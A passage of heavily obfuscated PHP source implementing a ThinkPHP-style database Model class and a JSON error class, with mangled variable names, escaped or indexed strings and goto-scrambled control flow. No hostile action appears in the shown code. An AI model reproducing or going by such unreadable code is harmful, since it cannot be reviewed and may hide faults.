(class_exists($EÑÍ½ÃÅ[1932])) { return PEAR::isError($B‡„ÂÁä×³, $EøÛÖí«°å); } elseif (is_object($B‡„ÂÁä×³) && (get_class($B‡„ÂÁä×³) == $EÑÍ½ÃÅ[1933] || is_subclass_of($B‡„ÂÁä×³, $EÑÍ½ÃÅ[1933]))) { return !0; } return !1; } } if (class_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1934])) { class Services_JSON_Error extends PEAR_Error { function __construct($bùÖÀš“  = "\x75\x6e\153\x6e\x6f\167\156\x20\x65\x72\x72\157\x72", $eÕ¼šˆåô = null, $eèƒÂŠ–³¦ = null, $B©Ù™®š¾Ï = null, $Eñ¢ĞÖÅĞ› = null) { parent::PEAR_Error($bùÖÀš“ , $eÕ¼šˆåô, $eèƒÂŠ–³¦, $B©Ù™®š¾Ï, $Eñ¢ĞÖÅĞ›); } } } else { class Services_JSON_Error { function __construct($f…¥ÈĞ¡İ = "\165\x6e\153\156\x6f\167\x6e\40\x65\x72\x72\157\x72", $cÈ‹Ì‹Ã« = null, $b¼¿¿Ï—”‡ = null, $AÉ¾Š¢˜™õ = null, $bÍ¬ÛŸã»æ = null) { } } } goto BŞªÙÍ²; cç”½´ˆî: define($_SERVER[ÚŠ•´ÍéÒÑÔ][227], 0); define($_SERVER[ÚŠ•´ÍéÒÑÔ][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\x6f\x72\144\145\x72", "\141\154\x69\141\x73", "\x68\141\166\151\156\147", "\147\x72\157\x75\x70", "\154\x6f\x63\x6b", "\144\151\x73\164\151\156\143\164", "\x61\x75\164\x6f", "\x66\151\154\164\x65\162", "\166\141\154\x69\144\x61\x74\145", "\162\x65\x73\x75\x6c\164", "\142\x69\156\x64", "\x74\x6f\153\145\156"); public function __construct($DÉ˜–÷ÁÆ = '', $eçÕ˜ÓÍ“¨ = '', $e²„¸¶ïÈî = '') { $bô¡éˆ¯İ¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->_initialize(); if (!empty($DÉ˜–÷ÁÆ)) { if (strpos($DÉ˜–÷ÁÆ, $bô¡éˆ¯İ¼[93])) { list($this->dbName, $this->name) = explode($bô¡éˆ¯İ¼[93], $DÉ˜–÷ÁÆ); } else { $this->name = $DÉ˜–÷ÁÆ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eçÕ˜ÓÍ“¨)) { $this->tablePrefix = $bô¡éˆ¯İ¼[33]; } elseif ($bô¡éˆ¯İ¼[33] != $eçÕ˜ÓÍ“¨) { $this->tablePrefix = $eçÕ˜ÓÍ“¨; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($bô¡éˆ¯İ¼[229]); } $this->db(0, empty($this->connection) ? $e²„¸¶ïÈî : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $c„Íğä­ô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($this->fields)) { if (think_config($c„Íğä­ô[230])) { $AÂ˜ì‚Š³é = $this->dbName ? $this->dbName : think_config($c„Íğä­ô[231]); $eó‹ñÏŞ° = think_var_cache($c„Íğä­ô[232] . strtolower(get_path_this($AÂ˜ì‚Š³é) . $c„Íğä­ô[93] . $this->name)); if ($eó‹ñÏŞ°) { $c²Éƒ­¼‚ï = think_config($c„Íğä­ô[233]); if (empty($c²Éƒ­¼‚ï) || $eó‹ñÏŞ°[$c„Íğä­ô[234]] == $c²Éƒ­¼‚ï) { $this->fields = $eó‹ñÏŞ°; return; } } } $this->flush(); } } public function flush() { goto Cùó”Ê³ùË; Cùó”Ê³ùË: $AÒ¡ãæ’¯· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->db->setModel($this->name); $eğª¶ÀßÛŠ = $this->db->getFields($this->getTableName()); goto FŠ‡™ˆŞÚ; Cá’‚‹ßàº: foreach ($eğª¶ÀßÛŠ as $còÔñŒ‹ğ‰ => $cÜÔÛ¥Èš) { $b˜ÀÏÄ¯Ş×[$còÔñŒ‹ğ‰] = $cÜÔÛ¥Èš[$AÒ¡ãæ’¯·[29]]; if ($cÜÔÛ¥Èš[$AÒ¡ãæ’¯·[36]]) { $this->fields[$AÒ¡ãæ’¯·[236]] = $còÔñŒ‹ğ‰; if ($cÜÔÛ¥Èš[$AÒ¡ãæ’¯·[39]]) { $this->fields[$AÒ¡ãæ’¯·[235]] = !0; } } } $this->fields[$AÒ¡ãæ’¯·[237]] = $b˜ÀÏÄ¯Ş×; if (think_config($AÒ¡ãæ’¯·[233])) { $this->fields[$AÒ¡ãæ’¯·[234]] = think_config($AÒ¡ãæ’¯·[233]); } goto Cµ‹¢„¶‹’; Cµ‹¢„¶‹’: if (think_config($AÒ¡ãæ’¯·[230])) { $Aë°ƒé±† = $this->dbName ? $this->dbName : think_config($AÒ¡ãæ’¯·[231]); think_var_cache($AÒ¡ãæ’¯·[232] . strtolower(get_path_this($Aë°ƒé±†) . $AÒ¡ãæ’¯·[93] . $this->name), $this->fields); } goto A‰í—Ûä²ñ; FŠ‡™ˆŞÚ: if (!$eğª¶ÀßÛŠ) { return !1; } $this->fields = array_keys($eğª¶ÀßÛŠ); $this->fields[$AÒ¡ãæ’¯·[235]] = !1; goto Cá’‚‹ßàº; A‰í—Ûä²ñ: } public function switchModel($C™ŞßÃñ¨, $cÒÖ´“§İ = array()) { $aŒëºØ¤ä– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fë‘ø°Ÿ™ = ucwords(strtolower($C™ŞßÃñ¨)) . $aŒëºØ¤ä–[238]; if (!class_exists($fë‘ø°Ÿ™)) { think_exception($fë‘ø°Ÿ™ . think_lang($aŒëºØ¤ä–[239])); } $this->_extModel = new $fë‘ø°Ÿ™($this->name); if (!empty($cÒÖ´“§İ)) { foreach ($cÒÖ´“§İ as $a•‚Ùòî™ì) { $this->_extModel->setProperty($a•‚Ùòî™ì, $this->{$a•‚Ùòî™ì}); } } return $this->_extModel; } public function __set($fîÔ‡ÂÆÑ™, $f»éÄÑ‡­£) { $this->data[$fîÔ‡ÂÆÑ™] = $f»éÄÑ‡­£; } public function __get($b­—¹¸óß) { return isset($this->data[$b­—¹¸óß]) ? $this->data[$b­—¹¸óß] : null; } public function __isset($A¯ß³‹¦½) { return isset($this->data[$A¯ß³‹¦½]); } public function __unset($c«Œ¿¥Ëã) { unset($this->data[$c«Œ¿¥Ëã]); } public function __call($d©Ê„¶ë’ß, $fò™åƒ‡Š) { $aÖ–¡¤àîô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (in_array(strtolower($d©Ê„¶ë’ß), $this->methods, !0)) { $this->options[strtolower($d©Ê„¶ë’ß)] = $fò™åƒ‡Š[0]; return $this; } elseif (in_array(strtolower($d©Ê„¶ë’ß), array($aÖ–¡¤àîô[240], $aÖ–¡¤àîô[241], $aÖ–¡¤àîô[242], $aÖ–¡¤àîô[243], $aÖ–¡¤àîô[244]), !0)) { $Aê÷Âİ¹®’ = isset($fò™åƒ‡Š[0]) ? $fò™åƒ‡Š[0] : $aÖ–¡¤àîô[173]; $Aê÷Âİ¹®’ = $this->db->parseKey($Aê÷Âİ¹®’); return $this->getField(strtoupper($d©Ê„¶ë’ß) . $aÖ–¡¤àîô[245] . $Aê÷Âİ¹®’ . $aÖ–¡¤àîô[246] . $d©Ê„¶ë’ß, $aÖ–¡¤àîô[240]); } elseif (strtolower(substr($d©Ê„¶ë’ß, 0, 5)) == $aÖ–¡¤àîô[247]) { $Aê÷Âİ¹®’ = think_parse_name(substr($d©Ê„¶ë’ß, 5)); $A·‡êñœù[$Aê÷Âİ¹®’] = $fò™åƒ‡Š[0]; return $this->where($A·‡êñœù)->find(); } elseif (strtolower(substr($d©Ê„¶ë’ß, 0, 10)) == $aÖ–¡¤àîô[248]) { $DÁ±‹˜²ùÕ = think_parse_name(substr($d©Ê„¶ë’ß, 10)); $A·‡êñœù[$DÁ±‹˜²ùÕ] = $fò™åƒ‡Š[0]; return $this->where($A·‡êñœù)->getField($fò™åƒ‡Š[1]); } elseif (isset($this->_scope[$d©Ê„¶ë’ß])) { return $this->scope($d©Ê„¶ë’ß, $fò™åƒ‡Š[0]); } elseif (method_exists($this, $d©Ê„¶ë’ß)) { array_unshift($fò™åƒ‡Š, $d©Ê„¶ë’ß); return call_user_func_array(array($this, $aÖ–¡¤àîô[249]), $fò™åƒ‡Š); } else { return call_user_func_array(array(parent, $d©Ê„¶ë’ß), $fò™åƒ‡Š); } } protected function call() { goto f´Í¦™ÇØÍ; f´Í¦™ÇØÍ: $B‰ííÄç¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dƒ—íŠ‡¼¹ = func_get_args(); $FÃÌñéÓò = array_shift($Dƒ—íŠ‡¼¹); goto D‹É´½ÎÎ²; Cˆ™®äæÅè: if (isset($Dƒ—íŠ‡¼¹[$bÓ¹£†©‹ó]) && $Dƒ—íŠ‡¼¹[$bÓ¹£†©‹ó] === $FÃÌñéÓò) { think_exception(__CLASS__ . $B‰ííÄç¥[4] . $FÃÌñéÓò . think_lang($B‰ííÄç¥[250])); return; } $Dƒ—íŠ‡¼¹[] = $FÃÌñéÓò; if (method_exists($this, $B‰ííÄç¥[251])) { $eã½œº‘çË = call_user_func_array(array($this, $B‰ííÄç¥[252]), array($c²á¼ÖÙ˜, $Dƒ—íŠ‡¼¹)); if (!is_null($eã½œº‘çË) && $eã½œº‘çË !== !1) { return $eã½œº‘çË; } } goto DÂ¯²©¹§À; DÂ¯²©¹§À: $E¨¸½Øùæ = call_user_func_array(array($this, $FÃÌñéÓò), $Dƒ—íŠ‡¼¹); if (method_exists($this, $B‰ííÄç¥[253])) { $eã½œº‘çË = call_user_func_array(array($this, $B‰ííÄç¥[254]), array($c²á¼ÖÙ˜, $Dƒ—íŠ‡¼¹, $E¨¸½Øùæ)); if ($eã½œº‘çË) { return $eã½œº‘çË; } } return $E¨¸½Øùæ; goto F¸àœ¿Æ‰; D‹É´½ÎÎ²: $c²á¼ÖÙ˜ = $FÃÌñéÓò; if (is_array($FÃÌñéÓò)) { $c²á¼ÖÙ˜ = $FÃÌñéÓò[1]; $FÃÌñéÓò = $FÃÌñéÓò[0]; } $bÓ¹£†©‹ó = count($Dƒ—íŠ‡¼¹) - 1; goto Cˆ™®äæÅè; F¸àœ¿Æ‰: } protected function _initialize() { } protected function _facade($fÂÔ½Š‡Ñ) { $Aãˆ·ï–†‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($this->fields)) { foreach ($fÂÔ½Š‡Ñ as $e½Áè¨– => $e¥´µÄåÄ) { if (!in_array($e½Áè¨–, $this->fields, !0)) { unset($fÂÔ½Š‡Ñ[$e½Áè¨–]); } elseif (is_scalar($e¥´µÄåÄ)) { $this->_parseType($fÂÔ½Š‡Ñ, $e½Áè¨–); } } } if (!empty($this->options[$Aãˆ·ï–†‘[255]])) { $fÂÔ½Š‡Ñ = array_map($this->options[$Aãˆ·ï–†‘[255]], $fÂÔ½Š‡Ñ); unset($this->options[$Aãˆ·ï–†‘[255]]); } $this->_beforeWrite($fÂÔ½Š‡Ñ); return $fÂÔ½Š‡Ñ; } protected function _beforeWrite(&$FÆö•‘æŒ‡) { } public function add($B×ô©Ìççç = '', $EœŠ‹îñ = array(), $f¾Õ¯Â»£ï = false) { goto EİÈôŒÉ‘ƒ; EİÈôŒÉ‘ƒ: if (empty($B×ô©Ìççç)) { if (!empty($this->data)) { $B×ô©Ìççç = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÚŠ•´ÍéÒÑÔ][256]); return !1; } } $EœŠ‹îñ = $this->_parseOptions($EœŠ‹îñ); $B×ô©Ìççç = $this->_facade($B×ô©Ìççç); goto eä°¯•âµ±; eä°¯•âµ±: if (!1 === $this->_beforeInsert($B×ô©Ìççç, $EœŠ‹îñ)) { return !1; } $e¤ó¶—Œ„ = $this->db->insert($B×ô©Ìççç, $EœŠ‹îñ, $f¾Õ¯Â»£ï); if (!1 !== $e¤ó¶—Œ„) { $E­å£äà = $this->getLastInsID(); if ($E­å£äà) { $B×ô©Ìççç[$this->getPk()] = $E­å£äà; $this->_after_insert($B×ô©Ìççç, $EœŠ‹îñ); return $E­å£äà; } $this->_after_insert($B×ô©Ìççç, $EœŠ‹îñ); } goto fÜ°óÒê…×; fÜ°óÒê…×: return $e¤ó¶—Œ„; goto E»Çé«ÙÖÇ; E»Çé«ÙÖÇ: } protected function _beforeInsert(&$bÇµõø‡²¸, $e½Ù¹éÔàº) { } protected function _after_insert($FÒ´éêÔ™–, $eÖ½ìœœ) { } public function addAll($eÛŸ‡ÕÖŒ, $A®¢ÅÉÌêÅ = array(), $Aâ¬Ç•°¥Ò = false) { goto f§ÅùÂÈÃ; f§ÅùÂÈÃ: $bÉ‚…ĞƒÏ— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($eÛŸ‡ÕÖŒ)) { $this->error = think_lang($bÉ‚…ĞƒÏ—[256]); return !1; } $A®¢ÅÉÌêÅ = $this->_parseOptions($A®¢ÅÉÌêÅ); goto AùÎ³³Œ­¨; a¾øäø¢‘¸: return $BÒÇİ…ê™ó; goto cÎß¯ˆ¿©é; AùÎ³³Œ­¨: foreach ($eÛŸ‡ÕÖŒ as $c‰„šŸåì™ => $aËõäÜ…) { $eÛŸ‡ÕÖŒ[$c‰„šŸåì™] = $this->_facade($aËõäÜ…); } if (method_exists($this->db, $bÉ‚…ĞƒÏ—[257])) { $BÒÇİ…ê™ó = $this->db->insertAll($eÛŸ‡ÕÖŒ, $A®¢ÅÉÌêÅ, $Aâ¬Ç•°¥Ò); } else { $this->startTrans(); foreach ($eÛŸ‡ÕÖŒ as $c‰„šŸåì™ => $aËõäÜ…) { $BÒÇİ…ê™ó = $this->db->insert($aËõäÜ…, $A®¢ÅÉÌêÅ, $Aâ¬Ç•°¥Ò); } $this->commit(); } if (!1 !== $BÒÇİ…ê™ó) { $bÁÓ•³ˆêÚ = $this->getLastInsID(); if ($bÁÓ•³ˆêÚ) { return $bÁÓ•³ˆêÚ; } } goto a¾øäø¢‘¸; cÎß¯ˆ¿©é: } public function selectAdd($E”Õ­Ş©‡Á = '', $Dô²î‰•ÇÔ = '', $bì›ÊÆº’Õ = array()) { $f“ÛÎ¨åöÍ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bì›ÊÆº’Õ = $this->_parseOptions($bì›ÊÆº’Õ); if (!1 === ($A³ë‹®‰…ª = $this->db->selectInsert($E”Õ­Ş©‡Á ? $E”Õ­Ş©‡Á : $bì›ÊÆº’Õ[$f“ÛÎ¨åöÍ[258]], $Dô²î‰•ÇÔ ? $Dô²î‰•ÇÔ : $this->getTableName(), $bì›ÊÆº’Õ))) { $this->error = think_lang($f“ÛÎ¨åöÍ[259]); return !1; } else { return $A³ë‹®‰…ª; } } public function save($eİ¥¼·¼ª = '', $A—Šã«äËÌ = array()) { goto FË„ÍÔï‰; A¯·¨Åó«ë: if (is_array($A—Šã«äËÌ[$B¸’–ÍéÖ‡[260]]) && isset($A—Šã«äËÌ[$B¸’–ÍéÖ‡[260]][$D¬«ŞÃÍë])) { $B˜Êè”ÚÔŒ = $A—Šã«äËÌ[$B¸’–ÍéÖ‡[260]][$D¬«ŞÃÍë]; } if (!1 === $this->_beforeUpdate($eİ¥¼·¼ª, $A—Šã«äËÌ)) { return !1; } $Bä¨¶å¢Ãµ = $this->db->update($eİ¥¼·¼ª, $A—Šã«äËÌ); goto CòÏâ…œÄ§; cÄÒ­ß×‡Å: $A—Šã«äËÌ = $this->_parseOptions($A—Šã«äËÌ); $D¬«ŞÃÍë = $this->getPk(); if (!isset($A—Šã«äËÌ[$B¸’–ÍéÖ‡[260]])) { if (isset($eİ¥¼·¼ª[$D¬«ŞÃÍë])) { $b‹îí²ù»[$D¬«ŞÃÍë] = $eİ¥¼·¼ª[$D¬«ŞÃÍë]; $A—Šã«äËÌ[$B¸’–ÍéÖ‡[260]] = $b‹îí²ù»; unset($eİ¥¼·¼ª[$D¬«ŞÃÍë]); } else { $this->error = think_lang($B¸’–ÍéÖ‡[259]); return !1; } } goto A¯·¨Åó«ë; FË„ÍÔï‰: $B¸’–ÍéÖ‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($eİ¥¼·¼ª)) { if (!empty($this->data)) { $eİ¥¼·¼ª = $this->data; $this->data = array(); } else { $this->error = think_lang($B¸’–ÍéÖ‡[256]); return !1; } } $eİ¥¼·¼ª = $this->_facade($eİ¥¼·¼ª); goto cÄÒ­ß×‡Å; CòÏâ…œÄ§: if (!1 !== $Bä¨¶å¢Ãµ) { if (isset($B˜Êè”ÚÔŒ)) { $eİ¥¼·¼ª[$D¬«ŞÃÍë] = $B˜Êè”ÚÔŒ; } $this->_afterUpdate($eİ¥¼·¼ª, $A—Šã«äËÌ); } return $Bä¨¶å¢Ãµ; goto cäã­©§‰„; cäã­©§‰„: } protected function _beforeUpdate(&$cÅÑœèã®, $d÷®Ê±Œ´â) { } protected function _afterUpdate($eÖÚˆ¤ë¹ƒ, $A¡ÎÑŒ©¥…) { } public function delete($DÎ£ÖÅÏ¸“ = array()) { goto eÙ¿©ŠÒ‡‘; A×‹òÔÎ¢: if (is_numeric($DÎ£ÖÅÏ¸“) || is_string($DÎ£ÖÅÏ¸“)) { if (strpos($DÎ£ÖÅÏ¸“, $BÓ«§„Àå[47])) { $Bæ‚«ğ˜èÓ[$CæĞ¦ç¸†”] = array($BÓ«§„Àå[261], $DÎ£ÖÅÏ¸“); } else { $Bæ‚«ğ˜èÓ[$CæĞ¦ç¸†”] = $DÎ£ÖÅÏ¸“; } $this->options[$BÓ«§„Àå[260]] = $Bæ‚«ğ˜èÓ; } $DÎ£ÖÅÏ¸“ = $this->_parseOptions(); if (is_array($DÎ£ÖÅÏ¸“[$BÓ«§„Àå[260]]) && isset($DÎ£ÖÅÏ¸“[$BÓ«§„Àå[260]][$CæĞ¦ç¸†”])) { $dªá†¨óâé = $DÎ£ÖÅÏ¸“[$BÓ«§„Àå[260]][$CæĞ¦ç¸†”]; } goto Cİä¤©ß¥; eÙ¿©ŠÒ‡‘: $BÓ«§„Àå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($DÎ£ÖÅÏ¸“) && empty($this->options[$BÓ«§„Àå[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $CæĞ¦ç¸†” = $this->getPk(); goto A×‹òÔÎ¢; Cİä¤©ß¥: $Aö…êºÂÄó = $this->db->delete($DÎ£ÖÅÏ¸“); if (!1 !== $Aö…êºÂÄó) { $a…ì—·§‡È = array(); if (isset($dªá†¨óâé)) { $a…ì—·§‡È[$CæĞ¦ç¸†”] = $dªá†¨óâé; } $this->_after_delete($a…ì—·§‡È, $DÎ£ÖÅÏ¸“); } return $Aö…êºÂÄó; goto cáàî‰ä©; cáàî‰ä©: } protected function _after_delete($dïï¡¡§’, $b»Ôæ ¡‡§) { } public function select($A·ø”ÜÍ¦Ø = array()) { goto BÜ‰ïŒÂ£ˆ; b„òâØ¤: $E­ˆÆ¦–ï´ = $this->db->select($A·ø”ÜÍ¦Ø); if (!1 === $E­ˆÆ¦–ï´) { return !1; } if (empty($E­ˆÆ¦–ï´)) { return null; } goto B»µÈëª; BÜ‰ïŒÂ£ˆ: $aéÍŠ–Å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_string($A·ø”ÜÍ¦Ø) || is_numeric($A·ø”ÜÍ¦Ø)) { $Bø×òËÒß = $this->getPk(); if (strpos($A·ø”ÜÍ¦Ø, $aéÍŠ–Å[47])) { $e³İô‹Á°[$Bø×òËÒß] = array($aéÍŠ–Å[261], $A·ø”ÜÍ¦Ø); } else { $e³İô‹Á°[$Bø×òËÒß] = $A·ø”ÜÍ¦Ø; } $this->options[$aéÍŠ–Å[260]] = $e³İô‹Á°; } elseif (!1 === $A·ø”ÜÍ¦Ø) { $A·ø”ÜÍ¦Ø = $this->_parseOptions(); return $aéÍŠ–Å[262] . $this->db->buildSelectSql($A·ø”ÜÍ¦Ø) . $aéÍŠ–Å[263]; } $A·ø”ÜÍ¦Ø = $this->_parseOptions(); goto b„òâØ¤; B»µÈëª: $this->_afterSelect($E­ˆÆ¦–ï´, $A·ø”ÜÍ¦Ø); return $E­ˆÆ¦–ï´; goto CÌßˆ¼‹‚; CÌßˆ¼‹‚: } protected function _afterSelect(&$CŒŸ£Ä™Ú, $Dš•’Â±) { } public function buildSql($dİ­ÌøÙ– = array()) { $B˜šëÀ„È =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dİ­ÌøÙ– = $this->_parseOptions($dİ­ÌøÙ–); return $B˜šëÀ„È[262] . $this->db->buildSelectSql($dİ­ÌøÙ–) . $B˜šëÀ„È[263]; } public function optionsValue($eÉ¾Ãšİ„ = null) { if (is_null($eÉ¾Ãšİ„)) { return $this->options; } elseif (is_array($eÉ¾Ãšİ„)) { $this->options = array_merge($this->options, $eÉ¾Ãšİ„); } } protected function _parseOptions($eÄ´«ŒÚÔÍ = array()) { goto E‡Ù†Å¤®ƒ; eÁÙ‡Â‰›ï: if (isset($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[260]]) && is_array($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[260]]) && !empty($a®ÈšÕêÁš) && !isset($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[267]]) && !isset($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[264]])) { foreach ($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[260]] as $d©õ¶ëå¯ => $fºèèèÁˆ) { $d©õ¶ëå¯ = trim($d©õ¶ëå¯); if (in_array($d©õ¶ëå¯, $a®ÈšÕêÁš, !0)) { if (is_scalar($fºèèèÁˆ)) { $this->_parseType($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[260]], $d©õ¶ëå¯); } } elseif (!is_numeric($d©õ¶ëå¯) && $eÀÈÌ¬’á[70] != substr($d©õ¶ëå¯, 0, 1) && !1 === strpos($d©õ¶ëå¯, $eÀÈÌ¬’á[93]) && !1 === strpos($d©õ¶ëå¯, $eÀÈÌ¬’á[245]) && !1 === strpos($d©õ¶ëå¯, $eÀÈÌ¬’á[268]) && !1 === strpos($d©õ¶ëå¯, $eÀÈÌ¬’á[269])) { unset($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[260]][$d©õ¶ëå¯]); } } } $this->_options_filter($eÄ´«ŒÚÔÍ); return $eÄ´«ŒÚÔÍ; goto dàà¬ÚÜ; E‡Ù†Å¤®ƒ: $eÀÈÌ¬’á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($eÄ´«ŒÚÔÍ)) { $eÄ´«ŒÚÔÍ = array_merge($this->options, $eÄ´«ŒÚÔÍ); } $this->options = array(); goto DŒÍç‰µÓİ; DŒÍç‰µÓİ: if (!isset($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[264]])) { $eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[264]] = $this->getTableName(); $a®ÈšÕêÁš = $this->fields; } else { $a®ÈšÕêÁš = $this->getDbFields(); } if (!empty($eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[265]])) { $eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[264]] .= $eÀÈÌ¬’á[50] . $eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[265]]; } $eÄ´«ŒÚÔÍ[$eÀÈÌ¬’á[266]] = $this->name; goto eÁÙ‡Â‰›ï; dàà¬ÚÜ: } protected function _options_filter(&$f·ˆ–´¤¹–) { } protected function _parseType(&$bé¬îïŸÒÏ, $BÉÀÓî§¡) { $f­…¯‚¦£Ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($this->options[$f­…¯‚¦£Ì[270]][$f­…¯‚¦£Ì[4] . $BÉÀÓî§¡])) { $bŠ÷ãÚ‘ñ¶ = strtolower($this->fields[$f­…¯‚¦£Ì[237]][$BÉÀÓî§¡]); if (!1 !== strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[271])) { } elseif (!1 === strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[272]) && !1 !== strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[273])) { $bé¬îïŸÒÏ[$BÉÀÓî§¡] = intval($bé¬îïŸÒÏ[$BÉÀÓî§¡]); } elseif (!1 !== strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[274]) || !1 !== strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[275])) { $bé¬îïŸÒÏ[$BÉÀÓî§¡] = floatval($bé¬îïŸÒÏ[$BÉÀÓî§¡]); } elseif (!1 !== strpos($bŠ÷ãÚ‘ñ¶, $f­…¯‚¦£Ì[276])) { $bé¬îïŸÒÏ[$BÉÀÓî§¡] = (bool) $bé¬îïŸÒÏ[$BÉÀÓî§¡]; } } } public function find($A„ç®è“ö = array()) { goto f‚Ú†Ãâ¤Ü; f‚Ú†Ãâ¤Ü: $aó÷ìÍ„«‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_numeric($A„ç®è“ö) || is_string($A„ç®è“ö)) { $eÁŠ™Ç©Û[$this->getPk()] = intval($A„ç®è“ö); $this->options[$aó÷ìÍ„«‚[260]] = $eÁŠ™Ç©Û; } $this->options[$aó÷ìÍ„«‚[277]] = 1; goto Aƒë‹ëÂòæ; c¢”÷¼È: if (empty($b˜É‡§åæ)) { return null; } $this->data = $b˜É‡§åæ[0]; $this->_afterFind($this->data, $A„ç®è“ö); goto bš–Â¼óæ; bš–Â¼óæ: if (!empty($this->options[$aó÷ìÍ„«‚[278]])) { return $this->returnResult($this->data, $this->options[$aó÷ìÍ„«‚[278]]); } return $this->data; goto bŒÓ‘Ç¥‹î; Aƒë‹ëÂòæ: $A„ç®è“ö = $this->_parseOptions(); $b˜É‡§åæ = $this->db->select($A„ç®è“ö); if (!1 === $b˜É‡§åæ) { return !1; } goto c¢”÷¼È; bŒÓ‘Ç¥‹î: } protected function _afterFind(&$dÜµ‚Å±Ù, $CêŞ‡šÜì) { } protected function returnResult($c‰îâÃùç±, $Aê¹İŞ¬ß¡ = '') { $B‡‹Ãã©µ¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($Aê¹İŞ¬ß¡) { if (is_callable($Aê¹İŞ¬ß¡)) { return call_user_func($Aê¹İŞ¬ß¡, $c‰îâÃùç±); } switch (strtolower($Aê¹İŞ¬ß¡)) { case $B‡‹Ãã©µ¤[279]: return json_encode($c‰îâÃùç±); case $B‡‹Ãã©µ¤[280]: return xml_encode($c‰îâÃùç±); } } return $c‰îâÃùç±; } public function parseFieldsMap($BÛø‘Â­×³, $b¾ê–ÉÆˆî = 1) { if (!empty($this->_map)) { foreach ($this->_map as $DÈËÍÌ‚“Ø => $c»ùÇØˆÎ¦) { if ($b¾ê–ÉÆˆî == 1) { if (isset($BÛø‘Â­×³[$c»ùÇØˆÎ¦])) { $BÛø‘Â­×³[$DÈËÍÌ‚“Ø] = $BÛø‘Â­×³[$c»ùÇØˆÎ¦]; unset($BÛø‘Â­×³[$c»ùÇØˆÎ¦]); } } else { if (isset($BÛø‘Â­×³[$DÈËÍÌ‚“Ø])) { $BÛø‘Â­×³[$c»ùÇØˆÎ¦] = $BÛø‘Â­×³[$DÈËÍÌ‚“Ø]; unset($BÛø‘Â­×³[$DÈËÍÌ‚“Ø]); } } } } return $BÛø‘Â­×³; } public function setField($bô»ÍóÔ—…, $AŞÕÚ’òÆ = '') { if (is_array($bô»ÍóÔ—…)) { $C”ÓøŒ¾†Ü = $bô»ÍóÔ—…; } else { $C”ÓøŒ¾†Ü[$bô»ÍóÔ—…] = $AŞÕÚ’òÆ; } return $this->save($C”ÓøŒ¾†Ü); } public function setAdd($aÚÓºÄª–´, $Fì†Ÿ¾­ = 1) { $B—°¬ÀÈª™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aˆ‡ÄšëÙÄ = $aÚÓºÄª–´ . $B—°¬ÀÈª™[281] . $Fì†Ÿ¾­; if ($Fì†Ÿ¾­ < 0) { $Aˆ‡ÄšëÙÄ = $aÚÓºÄª–´ . $Fì†Ÿ¾­; } return $this->setField($aÚÓºÄª–´, array($B—°¬ÀÈª™[282], $Aˆ‡ÄšëÙÄ)); } public function getField($DªáÈÊÛ÷§, $f¢ƒÅíÁÔÈ = null) { $E’åÀùÄè• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bô°Ê©¶‹»[$E’åÀùÄè•[258]] = $DªáÈÊÛ÷§; $Bô°Ê©¶‹» = $this->_parseOptions($Bô°Ê©¶‹»); $DªáÈÊÛ÷§ = trim($DªáÈÊÛ÷§); if (strpos($DªáÈÊÛ÷§, $E’åÀùÄè•[47])) { if (!isset($Bô°Ê©¶‹»[$E’åÀùÄè•[277]])) { $Bô°Ê©¶‹»[$E’åÀùÄè•[277]] = is_numeric($f¢ƒÅíÁÔÈ) ? $f¢ƒÅíÁÔÈ : $E’åÀùÄè•[33]; } $dØÜ‘‘Œ…‹ = $this->db->select($Bô°Ê©¶‹»); if (!empty($dØÜ‘‘Œ…‹)) { goto 